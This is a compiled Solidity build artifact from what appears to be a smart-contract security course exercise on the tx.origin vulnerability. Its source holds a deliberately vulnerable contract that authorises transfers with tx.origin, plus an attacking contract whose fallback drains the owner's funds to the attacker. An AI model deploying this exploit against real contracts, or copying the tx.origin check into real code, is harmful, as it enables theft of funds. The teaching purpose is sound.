{
  "contractName": "AttackingContract",
  "abi": [
    {
      "stateMutability": "nonpayable",
      "type": "fallback"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "myContractAddress",
          "type": "address"
        }
      ],
      "name": "attackingContract",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506102af806100206000396000f3fe608060405234801561001057600080fd5b506004361061002f5760003560e01c80633b5fdefc146100f857610030565b5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639e1a00aa600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff1660e01b81526004016100c49291906101f2565b600060405180830381600087803b1580156100de57600080fd5b505af11580156100f2573d6000803e3d6000fd5b50505050005b610112600480360381019061010d919061024c565b610114565b005b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101c382610198565b9050919050565b6101d3816101b8565b82525050565b6000819050919050565b6101ec816101d9565b82525050565b600060408201905061020760008301856101ca565b61021460208301846101e3565b9392505050565b600080fd5b610229816101b8565b811461023457600080fd5b50565b60008135905061024681610220565b92915050565b6000602082840312156102625761026161021b565b5b600061027084828501610237565b9150509291505056fea2646970667358221220f95d80b85adc32ba9b5ab8ccc93a7c6baeb4199f353c243c39cc55c07e0143e264736f6c634300080c0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.12;\r\n\r\ncontract MyContract {\r\n\r\n    address owner;\r\n\r\n    function myContract() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function sendTo(address receiver, uint amount) public {\r\n        require(tx.origin == owner);\r\n        (bool success, ) = receiver.call{value:amount}(\"\");\r\n        require(success);\r\n    }\r\n\r\n}\r\n\r\ncontract AttackingContract {\r\n\r\n    MyContract myContract;\r\n    address attacker;\r\n\r\n    function attackingContract(address myContractAddress) public {\r\n        myContract = MyContract(myContractAddress);\r\n        attacker = msg.sender;\r\n    }\r\n\r\n    fallback() external {\r\n        myContract.sendTo(attacker, msg.sender.balance);\r\n    }\r\n\r\n}\r\n",
  "sourcePath": "C:\\Users\\yanni\\Documents\\Formation Alyra\\Solidity_security\\contracts\\05_TxOrigin.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.12+commit.f00d7308.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2022-02-22T23:05:47.712Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}